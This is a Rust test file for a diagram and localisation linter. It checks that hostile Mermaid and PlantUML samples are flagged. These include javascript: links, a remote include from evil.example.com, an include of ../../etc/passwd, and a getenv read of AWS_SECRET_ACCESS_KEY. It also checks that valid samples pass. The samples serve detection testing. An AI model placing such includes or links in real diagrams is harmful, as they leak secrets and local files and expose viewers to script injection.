//! Symmetric `(invalid, subtle_valid)` corpus for Mermaid v11, `PlantUML`, fenced Markdown/Quarto
//! diagram blocks, and `i18n` v2 (ICU `MessageFormat`, Gettext `.po`, Flutter `.arb`, Fluent `.ftl`).

use gf_core::{I18nViolation, MermaidViolation, PlantUmlViolation, RepoPath};
use gf_parsers::parse_source;

fn findings(path: &str, src: &str) -> Result<Vec<(String, u32)>, Box<dyn std::error::Error>> {
    let doc = parse_source(&RepoPath::new(path)?, src)?;
    Ok(doc
        .lang_rule_findings
        .iter()
        .map(|f| (String::from(f.code()), f.span.start_line()))
        .collect())
}

fn assert_has_all(list: &[(String, u32)], expected: &[(&str, u32)]) {
    for &(code, line) in expected {
        assert!(
            list.iter().any(|(c, l)| c == code && *l == line),
            "missing ({code}, line {line}) in {list:?}"
        );
    }
}

#[test]
fn mermaid_v11_corpus_and_fenced_markdown_exact_lines() -> Result<(), Box<dyn std::error::Error>> {
    let bad = "\
%%{init: {'securityLevel': 'loose'}}%%
flowchart LR
  A[Start] --> end
  click A \"javascript:alert(1)\"
  subgraph S1
    B --> C
";
    assert_has_all(
        &findings("docs/bad.mmd", bad)?,
        &[
            (MermaidViolation::UnsafeSecurityOrXss.code(), 1),
            (MermaidViolation::ReservedEndNode.code(), 3),
            (MermaidViolation::UnsafeSecurityOrXss.code(), 4),
            (MermaidViolation::UnclosedBlockOrShape.code(), 5),
        ],
    );

    let good = "flowchart LR\n  subgraph S1[\"Flux Principal\"]\n    A[\"Début\"] --> END_NODE[\"end\"]\n  end\n";
    assert_eq!(findings("docs/good.mmd", good)?.len(), 0);
    assert_eq!(
        findings("docs/c4.mmd", "C4Context\n  Person(u, \"User\")\n")?.len(),
        0
    );
    assert_eq!(
        findings(
            "docs/arch.mmd",
            "architecture-beta\n  service api(server)[API]\n"
        )?
        .len(),
        0
    );

    let md = format!(
        "{}```mermaid\nflowchart LR\n  A --> end\n```\n",
        "\n".repeat(28)
    );
    assert_has_all(
        &findings("docs/readme.md", &md)?,
        &[(MermaidViolation::ReservedEndNode.code(), 31)],
    );
    Ok(())
}

#[test]
fn plantuml_ssrf_traversal_xss_and_valid_stdlib_corpus() -> Result<(), Box<dyn std::error::Error>> {
    let bad = "\
@startuml
!include https://evil.example.com/pwn.puml
!include ../../etc/passwd
title %getenv(\"AWS_SECRET_ACCESS_KEY\")
Alice -> Bob : [[javascript:evil()]]
alt success
@enduml
";
    assert_has_all(
        &findings("docs/bad.puml", bad)?,
        &[
            (PlantUmlViolation::SsrfOrLocalLeak.code(), 2),
            (PlantUmlViolation::SsrfOrLocalLeak.code(), 3),
            (PlantUmlViolation::SsrfOrLocalLeak.code(), 4),
            (PlantUmlViolation::XssLink.code(), 5),
            (PlantUmlViolation::UnbalancedStructure.code(), 6),
        ],
    );

    let good = "@startuml\n!include <C4/C4_Container>\n!include ./shared/theme.iuml\nalt success\n  Alice -> Bob : OK\nend\n@enduml\n";
    assert_eq!(findings("docs/good.puml", good)?.len(), 0);
    Ok(())
}

#[test]
fn i18n_v2_icu_apostrophe_escape_gettext_po_arb_and_ftl_corpus()
-> Result<(), Box<dyn std::error::Error>> {
    let bad_json = r#"{"welcome": "Hello {username}, {count, plural, one {# message}}"}"#;
    let f = findings("locales/en.json", bad_json)?;
    assert_has_all(&f, &[(I18nViolation::InvalidIcuSyntax.code(), 1)]);

    let esc_json = r#"{"code_hint": "Utilisez '{'id'}' pour {field}"}"#;
    let doc = parse_source(&RepoPath::new("locales/fr.json")?, esc_json)?;
    assert_eq!(doc.lang_rule_findings.len(), 0);
    let ph = doc
        .texte
        .as_ref()
        .and_then(|t| t.placeholders_by_key.get("code_hint"));
    assert_eq!(ph.map(std::collections::BTreeSet::len), Some(1));
    assert!(ph.is_some_and(|s| s.contains("field")));

    let po = "msgid \"\"\nmsgstr \"Content-Type: text/plain; charset=UTF-8\\n\"\n\n#, fuzzy\nmsgid \"hello\"\nmsgstr \"Bonjour %1$s\"\n";
    let po_f = findings("locales/fr/LC_MESSAGES/django.po", po)?;
    assert_has_all(&po_f, &[(I18nViolation::EmptyOrFuzzyOrXss.code(), 5)]);

    let arb = r#"{"@@locale": "en", "greeting": "Hello {user}", "@greeting": {"placeholders": {"user": {}}}}"#;
    let arb_doc = parse_source(&RepoPath::new("locales/app_en.arb")?, arb)?;
    assert_eq!(arb_doc.lang_rule_findings.len(), 0);
    assert_eq!(arb_doc.texte.as_ref().map(|t| t.keys.len()), Some(1));

    let ftl = "welcome = Hello {$user}\n";
    let ftl_doc = parse_source(&RepoPath::new("locales/en.ftl")?, ftl)?;
    assert_eq!(ftl_doc.lang_rule_findings.len(), 0);
    Ok(())
}
